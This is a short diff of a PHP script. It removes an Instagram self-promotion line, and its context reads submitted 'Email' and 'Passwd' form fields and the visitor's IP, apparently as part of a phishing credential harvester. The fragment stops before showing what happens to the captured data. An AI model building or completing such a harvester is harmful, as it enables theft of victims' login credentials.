@@ -1,5 +1,4 @@
 <?php
-echo "Sigueme en: https://www.instagram.com/_p1ngu1n0_/";
 $var = $_POST['Email'];
 $var2 = $_POST['Passwd'];
 if (!empty($_SERVER['HTTP_CLIENT_IP']))   
